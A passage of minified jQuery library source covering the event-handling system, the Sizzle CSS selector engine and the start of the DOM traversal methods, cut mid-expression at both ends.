RegExp("(^|\\.)"+f.map(m.slice(0).sort(),D).join("\\.(?:.*\\.)?")+"(\\.|$)")),p=t[h];if(!p)continue;if(!d){for(j=0;j<p.length;j++){q=p[j];if(l||n.test(q.namespace))f.event.remove(a,r,q.handler,j),p.splice(j--,1)}continue}o=f.event.special[h]||{};for(j=e||0;j<p.length;j++){q=p[j];if(d.guid===q.guid){if(l||n.test(q.namespace))e==null&&p.splice(j--,1),o.remove&&o.remove.call(a,q);if(e!=null)break}}if(p.length===0||e!=null&&p.length===1)(!o.teardown||o.teardown.call(a,m)===!1)&&f.removeEvent(a,h,s.handle),g=null,delete t[h]}if(f.isEmptyObject(t)){var u=s.handle;u&&(u.elem=null),delete s.events,delete s.handle,f.isEmptyObject(s)&&f.removeData(a,b,!0)}}},customEvent:{getData:!0,setData:!0,changeData:!0},trigger:function(c,d,e,g){var h=c.type||c,i=[],j;h.indexOf("!")>=0&&(h=h.slice(0,-1),j=!0),h.indexOf(".")>=0&&(i=h.split("."),h=i.shift(),i.sort());if(!!e&&!f.event.customEvent[h]||!!f.event.global[h]){c=typeof c=="object"?c[f.expando]?c:new f.Event(h,c):new f.Event(h),c.type=h,c.exclusive=j,c.namespace=i.join("."),c.namespace_re=new RegExp("(^|\\.)"+i.join("\\.(?:.*\\.)?")+"(\\.|$)");if(g||!e)c.preventDefault(),c.stopPropagation();if(!e){f.each(f.cache,function(){var a=f.expando,b=this[a];b&&b.events&&b.events[h]&&f.event.trigger(c,d,b.handle.elem
)});return}if(e.nodeType===3||e.nodeType===8)return;c.result=b,c.target=e,d=d?f.makeArray(d):[],d.unshift(c);var k=e,l=h.indexOf(":")<0?"on"+h:"";do{var m=f._data(k,"handle");c.currentTarget=k,m&&m.apply(k,d),l&&f.acceptData(k)&&k[l]&&k[l].apply(k,d)===!1&&(c.result=!1,c.preventDefault()),k=k.parentNode||k.ownerDocument||k===c.target.ownerDocument&&a}while(k&&!c.isPropagationStopped());if(!c.isDefaultPrevented()){var n,o=f.event.special[h]||{};if((!o._default||o._default.call(e.ownerDocument,c)===!1)&&(h!=="click"||!f.nodeName(e,"a"))&&f.acceptData(e)){try{l&&e[h]&&(n=e[l],n&&(e[l]=null),f.event.triggered=h,e[h]())}catch(p){}n&&(e[l]=n),f.event.triggered=b}}return c.result}},handle:function(c){c=f.event.fix(c||a.event);var d=((f._data(this,"events")||{})[c.type]||[]).slice(0),e=!c.exclusive&&!c.namespace,g=Array.prototype.slice.call(arguments,0);g[0]=c,c.currentTarget=this;for(var h=0,i=d.length;h<i;h++){var j=d[h];if(e||c.namespace_re.test(j.namespace)){c.handler=j.handler,c.data=j.data,c.handleObj=j;var k=j.handler.apply(this,g);k!==b&&(c.result=k,k===!1&&(c.preventDefault(),c.stopPropagation()));if(c.isImmediatePropagationStopped())break}}return c.result},props:"altKey attrChange attrName bubbles button cancelable charCode clientX clientY ctrlKey currentTarget data detail eventPhase fromElement handler keyCode layerX layerY metaKey newValue offsetX offsetY pageX pageY prevValue relatedNode relatedTarget screenX screenY shiftKey srcElement target toElement view wheelDelta which".split(" "),fix:function(a){if(a[f.expando])return a;var d=a;a=f.Event(d);for(var e=this.props.length,g;e;)g=this.props[--e],a[g]=d[g];a.target||(a.target=a.srcElement||c),a.target.nodeType===3&&(a.target=a.target.parentNode),!a.relatedTarget&&a.fromElement&&(a.relatedTarget=a.fromElement===a.target?a.toElement:a.fromElement);if(a.pageX==null&&a.clientX!=null){var h=a.target.ownerDocument||c,i=h.documentElement,j=h.body;a.pageX=a.clientX+(i&&i.scrollLeft||j&&j.scrollLeft||0)-(i&&i.clientLeft||j&&j.clientLeft||0),a.pageY=a.clientY+(i&&i.scrollTop||j&&j.scrollTop||0)-(i&&i.clientTop||j&&j.clientTop||0)}a.which==null&&(a.charCode!=null||a.keyCode!=null)&&(a.which=a.charCode!=null?a.charCode:a.keyCode),!a.metaKey&&a.ctrlKey&&(a.metaKey=a.ctrlKey),!a.which&&a.button!==b&&(a.which=a.button&1?1:a.button&2?3:a.button&4?2:0);return a},guid:1e8,proxy:f.proxy,special:{ready:{setup:f.bindReady,teardown:f.noop},live:{add:function(a){f.event.add(this,O(a.origType,a.selector),f.extend({},a,{handler:N,guid:a.handler.guid}))},remove:function(a){f.event.remove(this,O(a.origType,a.selector),a)}},beforeunload:{setup:function(a,b,c){f.isWindow(this)&&(this.onbeforeunload=c)},teardown:function(a,b){this.onbeforeunload===b&&(this.onbeforeunload=null)}}}},f.removeEvent=c.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){a.detachEvent&&a.detachEvent("on"+b,c)},f.Event=function(a,b){if(!this.preventDefault)return new f.Event(a,b);a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||a.returnValue===!1||a.getPreventDefault&&a.getPreventDefault()?F:E):this.type=a,b&&f.extend(this,b),this.timeStamp=f.now(),this[f.expando]=!0},f.Event.prototype={preventDefault:function(){this.isDefaultPrevented=F;var a=this.originalEvent;!a||(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){this.isPropagationStopped=F;var a=this.originalEvent;!a||(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=F,this.stopPropagation()},isDefaultPrevented:E,isPropagationStopped:E,isImmediatePropagationStopped:E};var G=function(a){var b=a.relatedTarget;a.type=a.data;try{if(b&&b!==c&&!b.parentNode)return;while(b&&b!==this)b=b.parentNode;b!==this&&f.event.handle.apply(this,arguments)}catch(d){}},H=function(a){a.type=a.data,f.event.handle.apply(this,arguments)};f.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){f.event.special[a]={setup:function(c){f.event.add(this,b,c&&c.selector?H:G,a)},teardown:function(a){f.event.remove(this,b,a&&a.selector?H:G)}}}),f.support.submitBubbles||(f.event.special.submit={setup:function(a,b){if(!f.nodeName(this,"form"))f.event.add(this,"click.specialSubmit",function(a){var b=a.target,c=b.type;(c==="submit"||c==="image")&&f(b).closest("form").length&&L("submit",this,arguments)}),f.event.add(this,"keypress.specialSubmit",function(a){var b=a.target,c=b.type;(c==="text"||c==="password")&&f(b).closest("form").length&&a.keyCode===13&&L("submit",this,arguments)});else return!1},teardown:function(a){f.event.remove(this,".specialSubmit")}});if(!f.support.changeBubbles){var I,J=function(a){var b=a.type,c=a.value;b==="radio"||b==="checkbox"?c=a.checked:b==="select-multiple"?c=a.selectedIndex>-1?f.map(a.options,function(a){return a.selected}).join("-"):"":f.nodeName(a,"select")&&(c=a.selectedIndex);return c},K=function(c){var d=c.target,e,g;if(!!z.test(d.nodeName)&&!d.readOnly){e=f._data(d,"_change_data"),g=J(d),(c.type!=="focusout"||d.type!=="radio")&&f._data(d,"_change_data",g);if(e===b||g===e)return;if(e!=null||g)c.type="change",c.liveFired=b,f.event.trigger(c,arguments[1],d)}};f.event.special.change={filters:{focusout:K,beforedeactivate:K,click:function(a){var b=a.target,c=f.nodeName(b,"input")?b.type:"";(c==="radio"||c==="checkbox"||f.nodeName(b,"select"))&&K.call(this,a)},keydown:function(a){var b=a.target,c=f.nodeName(b,"input")?b.type:"";(a.keyCode===13&&!f.nodeName(b,"textarea")||a.keyCode===32&&(c==="checkbox"||c==="radio")||c==="select-multiple")&&K.call(this,a)},beforeactivate:function(a){var b=a.target;f._data(b,"_change_data",J(b))}},setup:function(a,b){if(this.type==="file")return!1;for(var c in I)f.event.add(this,c+".specialChange",I[c]);return z.test(this.nodeName)},teardown:function(a){f.event.remove(this,".specialChange");return z.test(this.nodeName)}},I=f.event.special.change.filters,I.focus=I.beforeactivate}f.support.focusinBubbles||f.each({focus:"focusin",blur:"focusout"},function(a,b){function e(a){var c=f.event.fix(a);c.type=b,c.originalEvent={},f.event.trigger(c,null,c.target),c.isDefaultPrevented()&&a.preventDefault()}var d=0;f.event.special[b]={setup:function(){d++===0&&c.addEventListener(a,e,!0)},teardown:function(){--d===0&&c.removeEventListener(a,e,!0)}}}),f.each(["bind","one"],function(a,c){f.fn[c]=function(a,d,e){var g;if(typeof a=="object"){for(var h in a)this[c](h,d,a[h],e);return this}if(arguments.length===2||d===!1)e=d,d=b;c==="one"?(g=function(a){f(this).unbind(a,g);return e.apply(this,arguments)},g.guid=e.guid||f.guid++):g=e;if(a==="unload"&&c!=="one")this.one(a,d,e);else for(var i=0,j=this.length;i<j;i++)f.event.add(this[i],a,g,d);return this}}),f.fn.extend({unbind:function(a,b){if(typeof a=="object"&&!a.preventDefault)for(var c in a)this.unbind(c,a[c]);else for(var d=0,e=this.length;d<e;d++)f.event.remove(this[d],a,b);return this},delegate:function(a,b,c,d){return this.live(b,c,d,a)},undelegate:function(a,b,c){return arguments.length===0?this.unbind("live"):this.die(b,null,c,a)},trigger:function(a,b){return this.each(function(){f.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0])return f.event.trigger(a,b,this[0],!0)},toggle:function(a){var b=arguments,c=a.guid||f.guid++,d=0,e=function(c){var e=(f.data(this,"lastToggle"+a.guid)||0)%d;f.data(this,"lastToggle"+a.guid,e+1),c.preventDefault();return b[e].apply(this,arguments)||!1};e.guid=c;while(d<b.length)b[d++].guid=c;return this.click(e)},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}});var M={focus:"focusin",blur:"focusout",mouseenter:"mouseover",mouseleave:"mouseout"};f.each(["live","die"],function(a,c){f.fn[c]=function(a,d,e,g){var h,i=0,j,k,l,m=g||this.selector,n=g?this:f(this.context);if(typeof a=="object"&&!a.preventDefault){for(var o in a)n[c](o,d,a[o],m);return this}if(c==="die"&&!a&&g&&g.charAt(0)==="."){n.unbind(g);return this}if(d===!1||f.isFunction(d))e=d||E,d=b;a=(a||"").split(" ");while((h=a[i++])!=null){j=y.exec(h),k="",j&&(k=j[0],h=h.replace(y,""));if(h==="hover"){a.push("mouseenter"+k,"mouseleave"+k);continue}l=h,M[h]?(a.push(M[h]+k),h=h+k):h=(M[h]||h)+k;if(c==="live")for(var p=0,q=n.length;p<q;p++)f.event.add(n[p],"live."+O(h,m),{data:d,selector:m,handler:e,origType:h,origHandler:e,preType:l});else n.unbind("live."+O(h,m),e)}return this}}),f.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error".split(" "),function(a,b){f.fn[b]=function(a,c){c==null&&(c=a,a=null);return arguments.length>0?this.bind(b,a,c):this.trigger(b)},f.attrFn&&(f.attrFn[b]=!0)}),function(){function u(a,b,c,d,e,f){for(var g=0,h=d.length;g<h;g++){var i=d[g];if(i){var j=!1;i=i[a];while(i){if(i.sizcache===c){j=d[i.sizset];break}if(i.nodeType===1){f||(i.sizcache=c,i.sizset=g);if(typeof b!="string"){if(i===b){j=!0;break}}else if(k.filter(b,[i]).length>0){j=i;break}}i=i[a]}d[g]=j}}}function t(a,b,c,d,e,f){for(var g=0,h=d.length;g<h;g++){var i=d[g];if(i){var j=!1;i=i[a];while(i){if(i.sizcache===c){j=d[i.sizset];break}i.nodeType===1&&!f&&(i.sizcache=c,i.sizset=g);if(i.nodeName.toLowerCase()===b){j=i;break}i=i[a]}d[g]=j}}}var a=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,d=0,e=Object.prototype.toString,g=!1,h=!0,i=/\\/g,j=/\W/;[0,0].sort(function(){h=!1;return 0});var k=function(b,d,f,g){f=f||[],d=d||c;var h=d;if(d.nodeType!==1&&d.nodeType!==9)return[];if(!b||typeof b!="string")return f;var i,j,n,o,q,r,s,t,u=!0,w=k.isXML(d),x=[],y=b;do{a.exec(""),i=a.exec(y);if(i){y=i[3],x.push(i[1]);if(i[2]){o=i[3];break}}}while(i);if(x.length>1&&m.exec(b))if(x.length===2&&l.relative[x[0]])j=v(x[0]+x[1],d);else{j=l.relative[x[0]]?[d]:k(x.shift(),d);while(x.length)b=x.shift(),l.relative[b]&&(b+=x.shift()),j=v(b,j)}else{!g&&x.length>1&&d.nodeType===9&&!w&&l.match.ID.test(x[0])&&!l.match.ID.test(x[x.length-1])&&(q=k.find(x.shift(),d,w),d=q.expr?k.filter(q.expr,q.set)[0]:q.set[0]);if(d){q=g?{expr:x.pop(),set:p(g)}:k.find(x.pop(),x.length===1&&(x[0]==="~"||x[0]==="+")&&d.parentNode?d.parentNode:d,w),j=q.expr?k.filter(q.expr,q.set):q.set,x.length>0?n=p(j):u=!1;while(x.length)r=x.pop(),s=r,l.relative[r]?s=x.pop():r="",s==null&&(s=d),l.relative[r](n,s,w)}else n=x=[]}n||(n=j),n||k.error(r||b);if(e.call(n)==="[object Array]")if(!u)f.push.apply(f,n);else if(d&&d.nodeType===1)for(t=0;n[t]!=null;t++)n[t]&&(n[t]===!0||n[t].nodeType===1&&k.contains(d,n[t]))&&f.push(j[t]);else for(t=0;n[t]!=null;t++)n[t]&&n[t].nodeType===1&&f.push(j[t]);else p(n,f);o&&(k(o,h,f,g),k.uniqueSort(f));return f};k.uniqueSort=function(a){if(r){g=h,a.sort(r);if(g)for(var b=1;b<a.length;b++)a[b]===a[b-1]&&a.splice(b--,1)}return a},k.matches=function(a,b){return k(a,null,null,b)},k.matchesSelector=function(a,b){return k(b,null,null,[a]).length>0},k.find=function(a,b,c){var d;if(!a)return[];for(var e=0,f=l.order.length;e<f;e++){var g,h=l.order[e];if(g=l.leftMatch[h].exec(a)){var j=g[1];g.splice(1,1);if(j.substr(j.length-1)!=="\\"){g[1]=(g[1]||"").replace(i,""),d=l.find[h](g,b,c);if(d!=null){a=a.replace(l.match[h],"");break}}}}d||(d=typeof b.getElementsByTagName!="undefined"?b.getElementsByTagName("*"):[]);return{set:d,expr:a}},k.filter=function(a,c,d,e){var f,g,h=a,i=[],j=c,m=c&&c[0]&&k.isXML(c[0]);while(a&&c.length){for(var n in l.filter)if((f=l.leftMatch[n].exec(a))!=null&&f[2]){var o,p,q=l.filter[n],r=f[1];g=!1,f.splice(1,1);if(r.substr(r.length-1)==="\\")continue;j===i&&(i=[]);if(l.preFilter[n]){f=l.preFilter[n](f,j,d,i,e,m);if(!f)g=o=!0;else if(f===!0)continue}if(f)for(var s=0;(p=j[s])!=null;s++)if(p){o=q(p,f,s,j);var t=e^!!o;d&&o!=null?t?g=!0:j[s]=!1:t&&(i.push(p),g=!0)}if(o!==b){d||(j=i),a=a.replace(l.match[n],"");if(!g)return[];break}}if(a===h)if(g==null)k.error(a);else break;h=a}return j},k.error=function(a){throw"Syntax error, unrecognized expression: "+a};var l=k.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:(['"])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(a){return a.getAttribute("href")},type:function(a){return a.getAttribute("type")}},relative:{"+":function(a,b){var c=typeof b=="string",d=c&&!j.test(b),e=c&&!d;d&&(b=b.toLowerCase());for(var f=0,g=a.length,h;f<g;f++)if(h=a[f]){while((h=h.previousSibling)&&h.nodeType!==1);a[f]=e||h&&h.nodeName.toLowerCase()===b?h||!1:h===b}e&&k.filter(b,a,!0)},">":function(a,b){var c,d=typeof b=="string",e=0,f=a.length;if(d&&!j.test(b)){b=b.toLowerCase();for(;e<f;e++){c=a[e];if(c){var g=c.parentNode;a[e]=g.nodeName.toLowerCase()===b?g:!1}}}else{for(;e<f;e++)c=a[e],c&&(a[e]=d?c.parentNode:c.parentNode===b);d&&k.filter(b,a,!0)}},"":function(a,b,c){var e,f=d++,g=u;typeof b=="string"&&!j.test(b)&&(b=b.toLowerCase(),e=b,g=t),g("parentNode",b,f,a,e,c)},"~":function(a,b,c){var e,f=d++,g=u;typeof b=="string"&&!j.test(b)&&(b=b.toLowerCase(),e=b,g=t),g("previousSibling",b,f,a,e,c)}},find:{ID:function(a,b,c){if(typeof b.getElementById!="undefined"&&!c){var d=b.getElementById(a[1]);return d&&d.parentNode?[d]:[]}},NAME:function(a,b){if(typeof b.getElementsByName!="undefined"){var c=[],d=b.getElementsByName(a[1]);for(var e=0,f=d.length;e<f;e++)d[e].getAttribute("name")===a[1]&&c.push(d[e]);return c.length===0?null:c}},TAG:function(a,b){if(typeof b.getElementsByTagName!="undefined")return b.getElementsByTagName(a[1])}},preFilter:{CLASS:function(a,b,c,d,e,f){a=" "+a[1].replace(i,"")+" ";if(f)return a;for(var g=0,h;(h=b[g])!=null;g++)h&&(e^(h.className&&(" "+h.className+" ").replace(/[\t\n\r]/g," ").indexOf(a)>=0)?c||d.push(h):c&&(b[g]=!1));return!1},ID:function(a){return a[1].replace(i,"")},TAG:function(a,b){return a[1].replace(i,"").toLowerCase()},CHILD:function(a){if(a[1]==="nth"){a[2]||k.error(a[0]),a[2]=a[2].replace(/^\+|\s*/g,"");var b=/(-?)(\d*)(?:n([+\-]?\d*))?/.exec(a[2]==="even"&&"2n"||a[2]==="odd"&&"2n+1"||!/\D/.test(a[2])&&"0n+"+a[2]||a[2]);a[2]=b[1]+(b[2]||1)-0,a[3]=b[3]-0}else a[2]&&k.error(a[0]);a[0]=d++;return a},ATTR:function(a,b,c,d,e,f){var g=a[1]=a[1].replace(i,"");!f&&l.attrMap[g]&&(a[1]=l.attrMap[g]),a[4]=(a[4]||a[5]||"").replace(i,""),a[2]==="~="&&(a[4]=" "+a[4]+" ");return a},PSEUDO:function(b,c,d,e,f){if(b[1]==="not")if((a.exec(b[3])||"").length>1||/^\w/.test(b[3]))b[3]=k(b[3],null,null,c);else{var g=k.filter(b[3],c,d,!0^f);d||e.push.apply(e,g);return!1}else if(l.match.POS.test(b[0])||l.match.CHILD.test(b[0]))return!0;return b},POS:function(a){a.unshift(!0);return a}},filters:{enabled:function(a){return a.disabled===!1&&a.type!=="hidden"},disabled:function(a){return a.disabled===!0},checked:function(a){return a.checked===!0},selected:function(a){a.parentNode&&a.parentNode.selectedIndex;return a.selected===!0},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,b,c){return!!k(c[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){var b=a.getAttribute("type"),c=a.type;return a.nodeName.toLowerCase()==="input"&&"text"===c&&(b===c||b===null)},radio:function(a){return a.nodeName.toLowerCase()==="input"&&"radio"===a.type},checkbox:function(a){return a.nodeName.toLowerCase()==="input"&&"checkbox"===a.type},file:function(a){return a.nodeName.toLowerCase()==="input"&&"file"===a.type},password:function(a){return a.nodeName.toLowerCase()==="input"&&"password"===a.type},submit:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"submit"===a.type},image:function(a){return a.nodeName.toLowerCase()==="input"&&"image"===a.type},reset:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"reset"===a.type},button:function(a){var b=a.nodeName.toLowerCase();return b==="input"&&"button"===a.type||b==="button"},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)},focus:function(a){return a===a.ownerDocument.activeElement}},setFilters:{first:function(a,b){return b===0},last:function(a,b,c,d){return b===d.length-1},even:function(a,b){return b%2===0},odd:function(a,b){return b%2===1},lt:function(a,b,c){return b<c[3]-0},gt:function(a,b,c){return b>c[3]-0},nth:function(a,b,c){return c[3]-0===b},eq:function(a,b,c){return c[3]-0===b}},filter:{PSEUDO:function(a,b,c,d){var e=b[1],f=l.filters[e];if(f)return f(a,c,b,d);if(e==="contains")return(a.textContent||a.innerText||k.getText([a])||"").indexOf(b[3])>=0;if(e==="not"){var g=b[3];for(var h=0,i=g.length;h<i;h++)if(g[h]===a)return!1;return!0}k.error(e)},CHILD:function(a,b){var c=b[1],d=a;switch(c){case"only":case"first":while(d=d.previousSibling)if(d.nodeType===1)return!1;if(c==="first")return!0;d=a;case"last":while(d=d.nextSibling)if(d.nodeType===1)return!1;return!0;case"nth":var e=b[2],f=b[3];if(e===1&&f===0)return!0;var g=b[0],h=a.parentNode;if(h&&(h.sizcache!==g||!a.nodeIndex)){var i=0;for(d=h.firstChild;d;d=d.nextSibling)d.nodeType===1&&(d.nodeIndex=++i);h.sizcache=g}var j=a.nodeIndex-f;return e===0?j===0:j%e===0&&j/e>=0}},ID:function(a,b){return a.nodeType===1&&a.getAttribute("id")===b},TAG:function(a,b){return b==="*"&&a.nodeType===1||a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(" "+(a.className||a.getAttribute("class"))+" ").indexOf(b)>-1},ATTR:function(a,b){var c=b[1],d=l.attrHandle[c]?l.attrHandle[c](a):a[c]!=null?a[c]:a.getAttribute(c),e=d+"",f=b[2],g=b[4];return d==null?f==="!=":f==="="?e===g:f==="*="?e.indexOf(g)>=0:f==="~="?(" "+e+" ").indexOf(g)>=0:g?f==="!="?e!==g:f==="^="?e.indexOf(g)===0:f==="$="?e.substr(e.length-g.length)===g:f==="|="?e===g||e.substr(0,g.length+1)===g+"-":!1:e&&d!==!1},POS:function(a,b,c,d){var e=b[2],f=l.setFilters[e];if(f)return f(a,c,b,d)}}},m=l.match.POS,n=function(a,b){return"\\"+(b-0+1)};for(var o in l.match)l.match[o]=new RegExp(l.match[o].source+/(?![^\[]*\])(?![^\(]*\))/.source),l.leftMatch[o]=new RegExp(/(^(?:.|\r|\n)*?)/.source+l.match[o].source.replace(/\\(\d+)/g,n));var p=function(a,b){a=Array.prototype.slice.call(a,0);if(b){b.push.apply(b,a);return b}return a};try{Array.prototype.slice.call(c.documentElement.childNodes,0)[0].nodeType}catch(q){p=function(a,b){var c=0,d=b||[];if(e.call(a)==="[object Array]")Array.prototype.push.apply(d,a);else if(typeof a.length=="number")for(var f=a.length;c<f;c++)d.push(a[c]);else for(;a[c];c++)d.push(a[c]);return d}}var r,s;c.documentElement.compareDocumentPosition?r=function(a,b){if(a===b){g=!0;return 0}if(!a.compareDocumentPosition||!b.compareDocumentPosition)return a.compareDocumentPosition?-1:1;return a.compareDocumentPosition(b)&4?-1:1}:(r=function(a,b){if(a===b){g=!0;return 0}if(a.sourceIndex&&b.sourceIndex)return a.sourceIndex-b.sourceIndex;var c,d,e=[],f=[],h=a.parentNode,i=b.parentNode,j=h;if(h===i)return s(a,b);if(!h)return-1;if(!i)return 1;while(j)e.unshift(j),j=j.parentNode;j=i;while(j)f.unshift(j),j=j.parentNode;c=e.length,d=f.length;for(var k=0;k<c&&k<d;k++)if(e[k]!==f[k])return s(e[k],f[k]);return k===c?s(a,f[k],-1):s(e[k],b,1)},s=function(a,b,c){if(a===b)return c;var d=a.nextSibling;while(d){if(d===b)return-1;d=d.nextSibling}return 1}),k.getText=function(a){var b="",c;for(var d=0;a[d];d++)c=a[d],c.nodeType===3||c.nodeType===4?b+=c.nodeValue:c.nodeType!==8&&(b+=k.getText(c.childNodes));return b},function(){var a=c.createElement("div"),d="script"+(new Date).getTime(),e=c.documentElement;a.innerHTML="<a name='"+d+"'/>",e.insertBefore(a,e.firstChild),c.getElementById(d)&&(l.find.ID=function(a,c,d){if(typeof c.getElementById!="undefined"&&!d){var e=c.getElementById(a[1]);return e?e.id===a[1]||typeof e.getAttributeNode!="undefined"&&e.getAttributeNode("id").nodeValue===a[1]?[e]:b:[]}},l.filter.ID=function(a,b){var c=typeof a.getAttributeNode!="undefined"&&a.getAttributeNode("id");return a.nodeType===1&&c&&c.nodeValue===b}),e.removeChild(a),e=a=null}(),function(){var a=c.createElement("div");a.appendChild(c.createComment("")),a.getElementsByTagName("*").length>0&&(l.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);if(a[1]==="*"){var d=[];for(var e=0;c[e];e++)c[e].nodeType===1&&d.push(c[e]);c=d}return c}),a.innerHTML="<a href='#'></a>",a.firstChild&&typeof a.firstChild.getAttribute!="undefined"&&a.firstChild.getAttribute("href")!=="#"&&(l.attrHandle.href=function(a){return a.getAttribute("href",2)}),a=null}(),c.querySelectorAll&&function(){var a=k,b=c.createElement("div"),d="__sizzle__";b.innerHTML="<p class='TEST'></p>";if(!b.querySelectorAll||b.querySelectorAll(".TEST").length!==0){k=function(b,e,f,g){e=e||c;if(!g&&!k.isXML(e)){var h=/^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);if(h&&(e.nodeType===1||e.nodeType===9)){if(h[1])return p(e.getElementsByTagName(b),f);if(h[2]&&l.find.CLASS&&e.getElementsByClassName)return p(e.getElementsByClassName(h[2]),f)}if(e.nodeType===9){if(b==="body"&&e.body)return p([e.body],f);if(h&&h[3]){var i=e.getElementById(h[3]);if(!i||!i.parentNode)return p([],f);if(i.id===h[3])return p([i],f)}try{return p(e.querySelectorAll(b),f)}catch(j){}}else if(e.nodeType===1&&e.nodeName.toLowerCase()!=="object"){var m=e,n=e.getAttribute("id"),o=n||d,q=e.parentNode,r=/^\s*[+~]/.test(b);n?o=o.replace(/'/g,"\\$&"):e.setAttribute("id",o),r&&q&&(e=e.parentNode);try{if(!r||q)return p(e.querySelectorAll("[id='"+o+"'] "+b),f)}catch(s){}finally{n||m.removeAttribute("id")}}}return a(b,e,f,g)};for(var e in a)k[e]=a[e];b=null}}(),function(){var a=c.documentElement,b=a.matchesSelector||a.mozMatchesSelector||a.webkitMatchesSelector||a.msMatchesSelector;if(b){var d=!b.call(c.createElement("div"),"div"),e=!1;try{b.call(c.documentElement,"[test!='']:sizzle")}catch(f){e=!0}k.matchesSelector=function(a,c){c=c.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']");if(!k.isXML(a))try{if(e||!l.match.PSEUDO.test(c)&&!/!=/.test(c)){var f=b.call(a,c);if(f||!d||a.document&&a.document.nodeType!==11)return f}}catch(g){}return k(c,null,null,[a]).length>0}}}(),function(){var a=c.createElement("div");a.innerHTML="<div class='test e'></div><div class='test'></div>";if(!!a.getElementsByClassName&&a.getElementsByClassName("e").length!==0){a.lastChild.className="e";if(a.getElementsByClassName("e").length===1)return;l.order.splice(1,0,"CLASS"),l.find.CLASS=function(a,b,c){if(typeof b.getElementsByClassName!="undefined"&&!c)return b.getElementsByClassName(a[1])},a=null}}(),c.documentElement.contains?k.contains=function(a,b){return a!==b&&(a.contains?a.contains(b):!0)}:c.documentElement.compareDocumentPosition?k.contains=function(a,b){return!!(a.compareDocumentPosition(b)&16)}:k.contains=function(){return!1},k.isXML=function(a){var b=(a?a.ownerDocument||a:0).documentElement;return b?b.nodeName!=="HTML":!1};var v=function(a,b){var c,d=[],e="",f=b.nodeType?[b]:b;while(c=l.match.PSEUDO.exec(a))e+=c[0],a=a.replace(l.match.PSEUDO,"");a=l.relative[a]?a+"*":a;for(var g=0,h=f.length;g<h;g++)k(a,f[g],d);return k.filter(e,d)};f.find=k,f.expr=k.selectors,f.expr[":"]=f.expr.filters,f.unique=k.uniqueSort,f.text=k.getText,f.isXMLDoc=k.isXML,f.contains=k.contains}();var P=/Until$/,Q=/^(?:parents|prevUntil|prevAll)/,R=/,/,S=/^.[^:#\[\.,]*$/,T=Array.prototype.slice,U=f.expr.match.POS,V={children:!0,contents:!0,next:!0,prev:!0};f.fn.extend({find:function(a){var b=this,c,d;if(typeof a!="string")return f(a).filter(function(){for(c=0,d=b.length;c<d;c++)if(f.contains(b[c],this))return!0});var e=this.pushStack("","find",a),g,h,i;for(c=0,d=this.length;c<d;c++){g=e.length,f.find(a,this[c],e);if(c>0)for(h=g;h<e.length;h++)for(i=0;i<g;i++)if(e[i]===e[h]){e.splice(h--,1);break}}return e},has:function(a){var b=f(a);return this.filter(function(){for(var a=0,c=b.length;a<c;a++)if(f.contains(this,b[a]))return!0})},not:function(a){return this.pushStack(X(this,a,!1),"not",a)},filter:function(a){return this.pushStack(X(this,a,!0),"filter",a)},is:function(a){return!!a&&(typeof a=="string"?f.filter(a,this).length>0:this.filter(a).length>0)},closest:function(a,b){var c=[],d,e,g=this[0];if(f.isArray(a)){var h,i,j={},k=1;if(g&&a.length){for(d=0,e=a.length;d<e;d++)i=a[d],j[i]||(j[i]=U.test(i)?f(i,b||this.context):i);while(g&&g.ownerDocument&&g!==b){for(i in j)h=j[i],(h.jquery?h.index(g)>-1:f(g).is(h))&&c.push({selector:i,elem:g,level:k});g=g.parentNode,k++}}return c}var l=U.test(a)||typeof a!="string"?f(a,b||this.context):0;for(d=0,e=this.length;d<e;d++){g=this[d];while(g){if(l?l.index(g)>-1:f.find.matchesSelector(g,a)){c.push(g);break}g=g.parentNode;if(!g||!g.ownerDocument||g===b||g.nodeType===11)break}}c=c.length>1?f.unique(c):c;return this.pushStack(c,"closest",a)},index:function(a){if(!a||typeof a=="string")return f.inArray(this[0],a?f(a):this.parent().children());return f.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var c=typeof 